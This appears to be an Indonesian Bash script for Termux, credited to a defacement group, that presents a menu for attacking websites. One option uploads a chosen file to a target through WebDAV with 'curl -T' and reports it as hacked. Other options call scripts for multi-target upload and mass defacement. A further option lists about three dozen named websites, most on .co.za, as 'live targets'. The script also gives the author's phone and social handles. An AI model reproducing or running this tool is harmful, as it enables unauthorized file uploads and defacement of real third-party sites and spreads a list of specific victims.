#!/bin/bash
#version 1.0
#Apa kao ?
#Recode ? , kita pelukan dulu ea :v
clear
# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'
green="\033[32;1m"

echo $green  Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
clear
echo $green Selamat datang $nick ":)" Jones! :v

clear
cowsay -f eyes "Mr.R3f4ll" | lolcat
figlet -f slant "Mr.R3f4ll" | lolcat
echo "    <=====================[pepes]====================>" | lolcat
echo "    <=====[       Tools By Mr.R3f4ll     ]=====>" | lolcat
echo  "    <=====[  Concact Me : 082236299010  ]=====>" | lolcat
echo "    <======[ Team : Indo_Darknet_Army    ]=====>" | lolcat
echo "    <=====================[pepes]====================>" | lolcat
echo $green Selamat datang $nick ":)" Jones! :v

echo ""
echo "1. Webdav" | lolcat
echo "2. Multi Webdav" | lolcat
echo "3. Live Target" | lolcat
echo "4. Deface masal" | lolcat
echo "99. Exit" | lolcat
echo $green
read -p " Pilih Nomornya =>" pil;


if [ $pil = 1 ]
then
 cd /data/data/com.termux/files/home
read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Web Target => " T;
curl -T /sdcard/$sc $T
echo "[!] Terhack => " $T/$sc | lolcat
fi

if [ $pil = 2 ]
then
sh A.sh
fi

if [ $pil = 3 ]
then
echo "http://bee-it.co.za" | lolcat
echo  "http://safemode.co.za" | lolcat
echo "http://opiniong.com"  | lolcat
echo "http://butterflowers.co.za" | lolcat
echo "http://bananabox.co.za" | lolcat
echo "http://ayk.co.za" | lolcat
echo "http://ads247.co.za" | lolcat
echo "http://allpaint.co.za" | lolcat
echo "http://atlanticphysio.co.za" | lolcat
echo "http://valdicare.co.za" | lolcat
echo "http://vmicl.co.za" | lolcat
echo "http://troon.co.za" | lolcat
echo "http://nyarhi.co.za" | lolcat
echo "http://nitrobikes.co.za" | lolcat
echo "http://nhisa.co.za" | lolcat
echo "http://netcallcollect.co.za" | lolcat
echo "http://naturaleyeimages.com" | lolcat
echo "http://mpark.co.za" | lolcat
echo "http://contsol.co.za" | lolcat
echo "http://colourfactory.co.za" | lolcat
echo "http://chillibitez.co.za" | lolcat
echo "http://chasingfantasia.com" | lolcat
echo "http://centraltech.co.za" | lolcat
echo "http://cblandscapes.co.za" | lolcat
echo "http://moneyin1week.co.za" | lolcat
echo "http://mix007.co.za" | lolcat
echo "http://mediacube.co.za" | lolcat
echo "http://megro.co.za" | lolcat
echo "http://menogold.co.za" | lolcat
echo "http://mestern.co.za" | lolcat
echo "http://tcmgroup.co.za" | lolcat
echo "http://sublimeconfectionery.co.za" | lolcat
echo "http://tieronecapital.co.za" | lolcat
echo "http://thegiftstore.co.za" | lolcat
echo "http://thefoundation.co.za" | lolcat
echo "http://tressor.co.za" | lolcat
fi

if [ $pil = 4 ]
then
sh MASAL.sh
fi

if [ $pil = 99 ]
then
echo "Autor : Mr.R3f4ll" | lolcat
echo "WhatsApp : 082236299010" | lolcat
echo "TAEM         : Indo_Darknet_Arny" | lolcat
echo "Instagram  : @r3f4ll_" | lolcat
figlet -f slant "Mr.R3f4ll" | lolcat
echo '[!] Selamat Bertemu Lain Waktu...' | lolcat
exit
fi


